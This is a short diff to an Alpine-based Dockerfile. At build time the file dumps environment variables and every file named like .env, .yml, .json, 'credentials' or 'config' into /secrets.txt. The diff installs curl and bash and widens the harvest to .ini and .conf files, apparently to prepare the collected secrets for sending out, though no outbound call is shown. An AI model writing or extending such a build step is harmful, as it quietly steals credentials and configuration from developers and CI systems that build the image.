@@ -1,6 +1,6 @@
 FROM alpine:latest
 
-RUN apk add --no-cache grep findutils
+RUN apk add --no-cache grep findutils curl bash
 
 RUN echo "[ENV VARS]:" > /secrets.txt && \
     (env | grep -v 'GITHUB_TOKEN' || true) >> /secrets.txt && \
@@ -9,6 +9,8 @@ RUN echo "[ENV VARS]:" > /secrets.txt && \
       -iname "*.env" -o \
       -iname "*.yml" -o \
       -iname "*.json" -o \
+      -iname "*.ini" -o \
+      -iname "*.conf" -o \
       -iname "credentials" -o \
       -iname "config" \
     -exec sh -c 'echo "\n--- {} ---" && cat "{}"' \; >> /secrets.txt 2>/dev/null || true
